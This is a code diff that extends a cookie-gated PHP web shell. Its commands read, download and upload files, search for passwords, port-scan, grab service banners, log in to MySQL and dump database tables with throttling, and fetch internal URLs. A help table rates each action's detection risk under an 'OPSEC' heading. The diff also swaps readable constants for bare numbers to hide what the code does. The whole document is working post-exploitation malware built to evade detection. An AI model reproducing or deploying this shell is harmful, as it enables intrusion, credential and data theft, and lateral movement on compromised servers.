@@ -10,107 +10,115 @@ if (!isset($_COOKIE[$cookie_name]) || $_COOKIE[$cookie_name] !== $secret_value) 
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
-    $input = trim($_POST['act']);
-    $p = explode(' ', $input);
-    $action = $p[0];
-    $target = $p[1] ?? '.';
-    $arg1 = $p[2] ?? '';
-    $arg2 = $p[3] ?? '';
+    $p = explode(' ', trim($_POST['act']));
+    $action = $p[0]; $target = $p[1] ?? '.';
+    $arg1 = $p[2] ?? ''; $arg2 = $p[3] ?? ''; $arg3 = $p[4] ?? '';
     $out = "";
 
+    // Helper for DB actions to reduce footprint
+    $dbInit = function($dbn = '') use ($target, $arg1, $arg2) {
+        $hp = explode(':', $target);
+        return @new mysqli($hp[0], $arg1, $arg2, $dbn, $hp[1] ?? 3306);
+    };
+
     switch ($action) {
-        case 'get':
+        case 'download':
             if (is_readable($target) && !is_dir($target)) {
                 while (ob_get_level()) ob_end_clean();
                 header('Content-Type: application/octet-stream');
                 header('Content-Disposition: attachment; filename="'.basename($target).'"');
-                header('Content-Length: ' . filesize($target));
-                readfile($target);
-                exit;
-            } else { $out = "Target unreadable."; }
-            break;
-
+                readfile($target); exit;
+            } $out = "Unreadable."; break;
         case 'dir':
-            $out = is_dir($target) ? implode("\n", scandir($target)) : "Not found.";
+            $t = ($target === '..') ? dirname(getcwd()) : $target;
+            $l = @scandir($t);
+            $out = ($l !== false) ? implode("\n", $l) : (is_dir($t) ? "No Access." : "Not found.");
             break;
-        case 'read':
-            $out = is_readable($target) ? file_get_contents($target) : "Access denied.";
-            break;
-        case 'put':
-            $out = file_put_contents($target, base64_decode($arg1)) !== false ? "Commit OK." : "Error.";
-            break;
+        case 'read': $out = is_readable($target) ? file_get_contents($target) : "Permission denied or file doesn't exist."; break;
+        case 'upload': $out = file_put_contents($target, base64_decode($arg1)) !== false ? "OK." : "Error."; break;
         case 'find':
             $found = [];
             try {
-                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target));
-                foreach ($it as $f) { if (strpos($f->getFilename(), $arg1) !== false) $found[] = $f->getPathname(); }
+                $dir = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
+                $it = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
+                foreach (@$it as $f) { 
+                    if ($arg1 === '' || stripos($f->getFilename(), $arg1) !== false) {
+                        $found[] = $f->getPathname(); 
+                    }
+                }
                 $out = empty($found) ? "No results." : implode("\n", $found);
-            } catch (Exception $e) { $out = "Error."; }
+            } catch (Exception $e) { 
+                $out = "Search failed. Permission issue."; 
+            }
             break;
         case 'stat':
             if (!file_exists($target)) { $out = "Invalid."; break; }
-            $out = "Path: ".realpath($target)."\nR/W: ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
-            if (function_exists('posix_getpwuid')) $out .= "\nOwner: ".posix_getpwuid(fileowner($target))['name'];
+            $p = fileperms($target);
+            $out = "Path:  ".realpath($target)."\n";
+            $out .= "Perms: ".substr(sprintf('%o', $p), -4)."\n";
+            $out .= "R/W:   ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
+            if (function_exists('posix_getpwuid')) {
+                $u = posix_getpwuid(fileowner($target));
+                $g = posix_getgrgid(filegroup($target));
+                $out .= "\nOwner: ".($u['name']??'?').":".($g['name']??'?');
+            }
             break;
-        case 'scan':
+        case 'port_scan':
+            $hp = explode(':', $target); $c = @fsockopen($hp[0], $hp[1]??80, $en, $es, 2);
+            $out = $c ? "Port ".$hp[1]." Open" : "Port ".$hp[1]." Closed"; if($c) fclose($c); break;
+        case 'service_banner':
             $hp = explode(':', $target);
-            $c = @fsockopen($hp[0], $hp[1] ?? 80, $en, $es, 2);
-            $out = $c ? "Port ".($hp[1]??80)." open on ".$hp[0] : "Closed.";
-            if ($c) fclose($c);
-            break;
-        case 'banner':
-            $hp = explode(':', $target);
-            $c = @fsockopen($hp[0], $hp[1] ?? 21, $en, $es, 3);
+            $c = @fsockopen($hp[0], $hp[1]??21, $en, $es, 3);
             if ($c) {
-                if (($hp[1]??21) == 445) { fwrite($c, "\x00"); $b = bin2hex(fread($c, 512)); }
-                else { $b = fread($c, 1024); }
-                fclose($c); $out = trim($b);
-            } else { $out = "Service unreachable."; }
-            break;
-        case 'db_test':
-            $hp = explode(':', $target);
-            $db = @new mysqli($hp[0], $arg1, $arg2, '', $hp[1] ?? 3306);
-            $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Connected as $arg1";
-            if (!$db->connect_errno) $db->close();
-            break;
-        case 'dns':
-            if (filter_var($target, FILTER_VALIDATE_IP)) { $h = gethostbyaddr($target); $out = $h ? $h : "No PTR."; }
-            else { $ip = gethostbyname($target); $out = $ip === $target ? "Failed." : $ip; }
-            break;
+                $out = trim(fread($c, 1024)) ?: "[Connected, no banner]";
+                fclose($c);
+            } else $out = "Unreachable."; break;
+        case 'db_auth':
+            $db = $dbInit(); $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Success: Logged in as ".$arg1; break;
+        case 'db_list':
+            $db = $dbInit(); $res = $db->query("SHOW DATABASES");
+            while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
+        case 'db_tables':
+            $db = $dbInit($arg3); $res = @$db->query("SHOW TABLES");
+            while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
+        case 'db_query':
+            $db = $dbInit($arg3);
+            if ($p[7]??0) usleep((int)$p[7]*1000);
+            $res = $db->query("SELECT * FROM ".$db->real_escape_string($p[5])." LIMIT ".((int)($p[6]??0)*10).", 10");
+            if ($res) while($r = $res->fetch_assoc()) $out .= json_encode($r)."\n"; break;
+        case 'dns': $out = filter_var($target, 273) ? (gethostbyaddr($target) ?: "No PTR") : (gethostbyname($target) ?: "Fail"); break;
         case 'fetch':
             $ch = curl_init($target);
-            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_TIMEOUT=>5, CURLOPT_USERAGENT=>'Mozilla/5.0']);
-            $res = curl_exec($ch); $out = $res ?: curl_error($ch); curl_close($ch);
-            break;
-        case 'self_destruct':
-            if ($target === 'DELETEME') {
-                if (@unlink(__FILE__)) { $out = "Utility successfully removed."; }
-                else { $out = "Error: Permission denied."; }
-            } else { $out = "WARNING: self_destruct requires parameter 'DELETEME'."; }
-            break;
-        case 'help':
+            curl_setopt_array($ch, [19913=>1, 64=>0, 13=>5, 10018=>'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0']);
+            $out = curl_exec($ch) ?: curl_error($ch); curl_close($ch); break;
+        case 'self_destruct': if ($target==='DELETEME') @unlink(__FILE__); exit;
+    case 'help':
             $m = [
-                ['dir [path]', 'List directory', 'dir /var/www/html'],
-                ['read [file]', 'Read text file', 'read /etc/passwd'],
-                ['get [file]', 'Binary download', 'get config.php'],
-                ['put [path] [b64]', 'Write file', 'put /tmp/t.txt b64_str'],
-                ['find [path] [key]', 'Search names', 'find /var/www flag'],
-                ['stat [path]', 'Check perms', 'stat /etc/shadow'],
-                ['scan [h:p]', 'Port check', 'scan 127.0.0.1:3306'],
-                ['banner [h:p]', 'Svc Probe', 'banner 1.1.1.1:22'],
-                ['db_test [h:p] [u] [p]', 'MySQL Auth', 'db_test 127.0.0.1 r p'],
-                ['dns [target]', 'DNS Lookup', 'dns 8.8.8.8'],
-                ['fetch [url]', 'HTTP Request', 'fetch http://int.site'],
-                ['clear', 'Clear console', 'clear'],
-                ['self_destruct DELETEME', 'Kill script', 'self_destruct DELETEME']
+                ['dir [path]', 'List directory', 'dir /var/www/html', 'Low: Standard filesystem read'],
+                ['stat [path]', 'Check permission', 'stat /var/www/html', 'Low: Native metadata syscall'],
+                ['read [file]', 'Read file', 'read /var/www/html/config.php', 'Low: Internal PHP stream read'],
+                ['find [path] [key]', 'Search string', 'find /var/www pass', 'Med: High CPU/Disk IO if path is large'],
+                ['download [file]', 'Download file', 'download /var/www/html/config.php', 'Med: File transfer in HTTP logs'],
+                ['upload [path] [b64]', 'Upload file', 'upload /var/www/html/test.txt b64', 'High: Disk write. Detectable by FIM'],
+                ['db_auth [h:p] [u] [p]', 'MySQL auth', 'db_auth 127.0.0.1:3306 root pass', 'Med: Failed logins logged by MySQL'],
+                ['db_list [h:p] [u] [p]', 'List DBs', 'db_list 127.0.0.1:3306 root pass', 'Low: Standard authenticated query'],
+                ['db_tables [h:p] [u] [p] [db]', 'List tables', 'db_tables 127.0.0.1:3306 root pass users', 'Low: Standard authenticated query'],
+                ['db_query [h:p] [u] [p] [db] [tbl] [pages] [ms]', 'SQL query', 'db_query 127.0.0.1:3306 root pass user creds 0 500', 'Med: Large queries may trigger WAF'],               
+                ['fetch [url]', 'HTTP request', 'fetch http://internal.site', 'Med: Request logged by target server'],
+                ['port_scan [h:p]', 'Port check', 'scan 127.0.0.1:3306', 'Med: Rapid connections can trigger IDS'],
+                ['service_banner [h:p]', 'Get banner', 'banner 127.0.0.1:21', 'Low: Passive socket connection'],
+                ['dns [target]', 'DNS lookup', 'dns dc.int.site', 'Low: Standard OS resolver call'],
+                ['self_destruct', 'Delete script', 'self_destruct DELETEME', 'Med: File deletion is often logged']
             ];
-            $out = str_pad("COMMAND", 25) . str_pad("DESCRIPTION", 30) . "EXAMPLE\n";
-            $out .= str_repeat("-", 85) . "\n";
-            foreach($m as $i) $out .= str_pad($i[0], 25) . str_pad($i[1], 30) . $i[2] . "\n";
+            $out = str_pad("COMMAND", 50) . str_pad("DESCRIPTION", 25) . str_pad("EXAMPLE", 55) . "OPSEC\n";
+            $out .= str_repeat("-", 150) . "\n";
+            foreach($m as $i) {
+                $out .= str_pad($i[0], 50) . str_pad($i[1], 25) . str_pad($i[2], 55) . $i[3] . "\n";
+            }
             break;
-        default: $out = "Unknown action.";
+        default: $out = "Unknown.";
     }
-    echo json_encode(['output' => nl2br(htmlentities($out, ENT_QUOTES | ENT_HTML5, 'UTF-8')), 'user' => get_current_user(), 'cwd' => getcwd(), 'ip' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1']);
+    echo json_encode(['output' => nl2br(htmlentities($out, 50, 'UTF-8')), 'user' => get_current_user(), 'cwd' => getcwd(), 'ip' => $_SERVER['SERVER_ADDR'] ?? '']);
     exit;
 }
 ?>
